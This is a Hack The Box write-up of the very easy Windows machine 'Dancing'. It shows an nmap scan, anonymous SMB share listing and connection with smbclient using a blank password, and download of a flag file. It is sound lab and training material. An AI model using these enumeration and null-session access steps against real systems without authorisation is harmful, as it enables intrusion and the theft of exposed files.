# 💃 Hack The Box - Dancing



![Difficulty](https://img.shields.io/badge/Difficulty-Very_Easy-brightgreen)




![Category](https://img.shields.io/badge/Category-Starting_Point-blue)




![Platform](https://img.shields.io/badge/Platform-Hack_The_Box-green)




![Status](https://img.shields.io/badge/Status-Completed-success)



---

# 📌 Room Information

| Category | Details |
|----------|---------|
| Platform | Hack The Box |
| Machine | Dancing |
| Difficulty | Very Easy |
| Operating System | Windows |
| Status | ✅ Completed |

---

# 🎯 Objectives

- Learn basic SMB enumeration.
- Identify open ports and running services.
- List available SMB shares.
- Access a share using a blank password.
- Capture the flag.

---

# 🛠️ Tools Used

- Pwnbox
- Nmap
- smbclient

---

# 🌐 Target Information

| Target | Description |
|---------|-------------|
| Machine | Windows Target |
| Open Port | 445/TCP |
| Service | microsoft-ds (SMB) |

---

# 🔎 Enumeration

## Check Connectivity

```bash
ping <Target-IP>
```

## Scan the Target

```bash
nmap -sV <Target-IP>
```

### Result

| Port | State | Service |
|------|-------|---------|
| 445 | Open | microsoft-ds (SMB) |

---

# 🚀 Exploitation

## List the Available Shares

```bash
smbclient -L //<Target-IP>/ -N
```

The `-N` flag skips the password prompt (blank password).

### Shares Found

| Share | Type | Comment |
|-------|------|---------|
| ADMIN$ | Disk | Remote Admin |
| C$ | Disk | Default share |
| IPC$ | IPC | Remote IPC |
| WorkShares | Disk | - |

## Connect to the Accessible Share

```bash
smbclient //<Target-IP>/WorkShares -N
```

The `-N` flag logs in with a blank password.

---

# 📂 SMB Enumeration

List files and folders.

```bash
ls
```

Move into the folder that contains the flag.

```bash
cd James.P
ls
```

Download the flag.

```bash
get flag.txt
```

Exit the SMB session.

```bash
exit
```

Display the flag.

```bash
cat flag.txt
```

---

# 📚 What I Learned

- Basic SMB Enumeration.
- Identifying SMB services with Nmap.
- Listing shares with `smbclient -L`.
- Accessing shares with a blank password.
- Downloading files from an SMB share.

---

# 🔐 Key Takeaways

- SMB is used for file and printer sharing, usually on port 445.
- Shares that accept blank passwords can expose sensitive data.
- Default admin shares (`ADMIN$`, `C$`) require valid credentials.
- Always enumerate shares before attempting anything else.

---

# 💡 Skills Gained

- Nmap
- SMB
- smbclient
- Enumeration
- Windows Services
- File Transfer
- Windows File Sharing
- Network Reconnaissance

---

# ✅ Machine Completed Successfully 🎉

---

## 👨‍💻 Author

**Sayed Samy Elbadry**

### 🚀 Web Penetration Testing & Red Team Journey

**Platform:** Hack The Box
